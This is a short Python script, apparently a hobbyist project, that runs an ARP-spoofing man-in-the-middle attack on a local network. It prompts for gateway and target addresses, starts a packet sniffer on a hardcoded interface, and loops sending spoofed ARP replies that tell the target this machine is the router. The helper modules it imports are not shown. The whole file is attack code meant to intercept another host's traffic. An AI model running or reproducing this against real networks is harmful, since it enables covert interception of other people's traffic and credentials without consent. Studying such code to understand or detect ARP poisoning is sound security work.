import arp_spoofing
import sniffer
import check_ping
import time
from threading import Thread

def doing_arp_spoofing(target_ip, target_mac, gateway_ip, gateway_mac):
    # Doing arp spoofing
    while True:
        # Tell the target ip that I am the router and send the packets to me
        arp_spoofing.arp_spoof(target_ip, target_mac, gateway_ip)
        # Tell the router that I am the target ip and send his packets to me
        # arp_spoofing.arp_spoof(gateway_ip, gateway_mac, target_ip)
        print("spoofing")
        # Doing delay of 2 seconds
        time.sleep(2)

def doing_sniffer(interface):
    # Doing sniffer about my interface controller network
    sniffer.sniff(interface)

if __name__ =="__main__":
    network_prefix = input("Enter your prefix network ( exe : '10.13.45' ) : ")
    gateway_network_suffix = input("Enter the suffix number of the gateway IP ( 1 - 255 ) : ")
    target_network_suffix = input("Enter the suffix number of the target IP ( 1 - 255 ) : ")

    gateway_ip = "{}.{}".format(network_prefix, gateway_network_suffix)
    target_ip = "{}.{}".format(network_prefix, target_network_suffix)
    interface = "Realtek PCIe GbE Family Controller #2"

    # Creating thread that doing sniffer
    sniff = Thread(target=doing_sniffer, args=(interface,))

    # Check if the target is connected
    if check_ping.check_ping(target_ip):
        # Start the sniff and arp spoofing
        sniff.start()
        target_mac = arp_spoofing.find_mac(target_ip)
        gateway_mac = arp_spoofing.find_mac(gateway_ip)
        doing_arp_spoofing(target_ip, target_mac, gateway_ip, gateway_mac)